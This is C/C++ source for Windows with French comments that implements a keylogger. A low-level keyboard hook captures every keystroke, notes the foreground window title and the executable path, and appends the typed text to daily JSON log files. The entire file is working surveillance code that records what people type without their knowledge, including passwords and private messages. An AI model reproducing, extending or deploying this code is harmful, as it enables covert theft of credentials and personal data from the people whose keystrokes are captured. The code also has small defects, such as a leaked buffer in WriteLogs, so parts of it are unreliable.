#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************************************/
//Fonction de callback du hook sur le clavier
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
{
    BYTE  keyboardState[255] = { 0 };
    WCHAR unicodeChar = 0;
    static WCHAR logsBuffer[32768] = { 0 };
    static WCHAR appName[32768] = { 0 };
    static HWND  prevForegroundApp = NULL;
    static DWORD processId = 0;
    static WCHAR path[32768] = { 0 };
    HANDLE process = NULL;
    HWND foregroundApp = NULL;
    HANDLE file = NULL;
    cJSON* createdJsonObject = NULL;

    switch (wParam)
    {
    //Si le bouton gauche est cliqué
    case WM_LBUTTONDOWN:
        //On récupère la fenêtre qui se trouve au premier plan
        foregroundApp = GetForegroundWindow();

        if (wcslen(logsBuffer) > 0) //Si logsBuffer n'est pas vide
        {
            WriteLogs(logsBuffer, appName, path);

            //On vide logsBuffer
            memset(logsBuffer, 0, sizeof(logsBuffer));
        }
        break;

    //Si une touche est appuyée
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:

        //On récupère l'état des touches
        for (INT i = 0; i < sizeof(keyboardState); i++)
            keyboardState[i] = (BYTE)GetKeyState(i);

        //On récupère le caractère unicode associé à la touche appuyée
        if (ToUnicodeEx(((LPKBDLLHOOKSTRUCT)lParam)->vkCode, ((LPKBDLLHOOKSTRUCT)lParam)->scanCode, keyboardState, &unicodeChar, 1, ((LPKBDLLHOOKSTRUCT)lParam)->flags, GetKeyboardLayout(0)) > 0)
        {
            //On récupère la fenêtre qui se trouve au premier plan
            foregroundApp = GetForegroundWindow();

            //Si logsBuffer est plein
            if (wcslen(logsBuffer) == sizeof(logsBuffer) / sizeof(WCHAR) - 1)
            {
                WriteLogs(logsBuffer, appName, path);

                //On vide logsBuffer
                memset(logsBuffer, 0, sizeof(logsBuffer));
            }

            if (foregroundApp != prevForegroundApp) //Si la foregroundApp n'est pas la même que la précédante
            {
                if (wcslen(logsBuffer) > 0) //Si logsBuffer n'est pas vide
                {
                    WriteLogs(logsBuffer, appName, path);

                    //On vide logsBuffer
                    memset(logsBuffer, 0, sizeof(logsBuffer));
                }

                //On vide appName et path
                memset(appName, 0, sizeof(appName));
                memset(path, 0, sizeof(path));

                prevForegroundApp = foregroundApp;
                //On récupère le nom de la fenêtre au premier plan
                GetWindowText(foregroundApp, appName, sizeof(appName));

                //On ouvre le processus de la fenêtre au plan
                GetWindowThreadProcessId(foregroundApp, &processId);
                process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);

                //On recupère le chemin complet de l'executable du processus de la fenêtre au premier plan
                GetModuleFileNameEx(process, NULL, path, sizeof(path) / sizeof(WCHAR) - 1);

                CloseHandle(process);
            }

            switch (unicodeChar)
            {
            case VK_BACK:   //Si on appuie sur backspace et que le buffer n'est pas vide, on efface un caractere du buffer
                if (wcslen(logsBuffer) > 0)
                    logsBuffer[wcslen(logsBuffer) - 1] = 0;
                break;
            case VK_RETURN: //Si on appuie sur la touche entrée et que logsBuffer n'est pas vide
                if (wcslen(logsBuffer) > 0)
                {
                    WriteLogs(logsBuffer, appName, path);
                    //On vide logsBuffer
                    memset(logsBuffer, 0, sizeof(logsBuffer));
                }
                break;
            default:    //Sinon
                logsBuffer[wcslen(logsBuffer)] = unicodeChar; //On rajoute le caractère dans logsBuffer
                break;
            }
        }
    }

    return CallNextHookEx(0, code, wParam, lParam);
}
/********************************************************************************************************************************************************/
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
{
    cJSON* createdJsonObject = NULL;
    PCHAR logsUTF8 = NULL;
    PCHAR appNameUTF8 = NULL;
    PCHAR pathUTF8 = NULL;

    logsUTF8 = encode_UTF8(logsUnicode);
    appNameUTF8 = encode_UTF8(appNameUnicode);
    pathUTF8 = encode_UTF8(pathUnicode);
    createdJsonObject = CreateJsonLogsObject(logsUTF8, appNameUTF8, pathUTF8);
    WriteJsonObjectLogs(createdJsonObject);

    HeapFree(GetProcessHeap(), NULL, logsUTF8);
    HeapFree(GetProcessHeap(), NULL, appNameUTF8);
}
/********************************************************************************************************************************************************/
//Fonction qui crée un objet javascript contenant les logs
cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path)
{
    cJSON* object = NULL;
    PCHAR jsonString = NULL;

    object = cJSON_CreateObject();

    cJSON_AddNumberToObject(object, "timestamp", (const double)GetTimestamp(FALSE));
    cJSON_AddStringToObject(object, "path", path);
    cJSON_AddStringToObject(object, "application", app);
    cJSON_AddStringToObject(object, "logs", logs);

#ifdef DEBUG
    jsonString = cJSON_Print(object);
    printf("%s\n", jsonString);
    free(jsonString);
#endif // DEBUG


    return object;
}
/********************************************************************************************************************************************************/
//Fonction qui écrit les logs dans un fichier JSON
VOID WriteJsonObjectLogs(cJSON* newJsonObject)
{
    HANDLE hJsonFile = NULL;
    DWORD jsonFileSize = 0;
    PCHAR jsonFileContent = NULL;
    DWORD bytesRead = 0;
    cJSON* jsonPrincipalArray = NULL;
    PCHAR jsonFinalContent = NULL;
    WCHAR filename[32768] = { 0 };
    SYSTEMTIME system_time = UnixTimestampToSystemTime(GetTimestamp(FALSE));

    system_time.wHour = 0;
    system_time.wMinute = 0;
    system_time.wSecond = 0;
    system_time.wMilliseconds = 0;

    //Le nom du fichier sera le timestamp du jour
    wsprintf(filename, L"%ls\\%ld.json", DATA_FOLDER_W, SystemTimeToUnixTimestamp(system_time));

    //On ouvre le fichier
    if ((hJsonFile = CreateFile(filename, FILE_GENERIC_READ|FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return;
    
    //On place le curseur à la fin du fichier
    if (SetFilePointer(hJsonFile, 0, 0, FILE_END) == INVALID_SET_FILE_POINTER)
    {
        CloseHandle(hJsonFile);
        return;
    }

    //On récupère la taille du fichier dans jsonFileSize
    if ((jsonFileSize = SetFilePointer(hJsonFile, 0, 0, FILE_CURRENT)) == INVALID_SET_FILE_POINTER)
    {
        CloseHandle(hJsonFile);
        return;
    }

    if (jsonFileSize == 0) //Si le fichier est vide
    {
        jsonPrincipalArray = cJSON_CreateArray();
    }
    else if (jsonFileSize > 0) //Sinon si le fichier n'est pas vide
    {
        //On revient au début du fichier
        if (SetFilePointer(hJsonFile, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
        {
            CloseHandle(hJsonFile);
            return;
        }
        //On alloue de la mémoire pour la chaine de caractère qui va contenir le contenu du fichier json
        if ((jsonFileContent = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, jsonFileSize + 1)) == NULL)
        {
            CloseHandle(hJsonFile);
            return;
        }
        //On lit le fichier json et on place le contenu dans jsonContent
        if (ReadFile(hJsonFile, jsonFileContent, jsonFileSize, &bytesRead, NULL) == FALSE)
        {
            HeapFree(GetProcessHeap(), NULL, jsonFileContent);
            CloseHandle(hJsonFile);
            return;
        }

        //On parse jsonContent et on met le tout dans parsedJson
        jsonPrincipalArray = cJSON_Parse(jsonFileContent);

        //On libère la mémoire de jsonFileContent
        HeapFree(GetProcessHeap(), NULL, jsonFileContent);
    }

    if (jsonPrincipalArray != NULL) //Si le fichier json a été correctement parsé ou jsonPrincipalArray a bien été crée
    {
        //On ajoute newJsonObject à jsonPrincipalArray
        cJSON_AddItemToArray(jsonPrincipalArray, newJsonObject);

        //On met le json final dans jsonFinalContent
        jsonFinalContent = cJSON_Print(jsonPrincipalArray);

        //On revient au début du fichier
        if (SetFilePointer(hJsonFile, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
        {
            CloseHandle(hJsonFile);
            return;
        }

        WriteFile(hJsonFile, (LPCVOID)jsonFinalContent, (DWORD)strlen(jsonFinalContent), NULL, NULL);

        cJSON_Delete(jsonPrincipalArray);
        free(jsonFinalContent);

#ifdef DEBUG
        wprintf(L"Logs ecrits dans le fichier %ls\n", filename);
        printf("-----------------------------------------\n\n");
#endif //DEBUG 

    }
    
    CloseHandle(hJsonFile);
}
/********************************************************************************************************************************************************/

EXTERN_C_END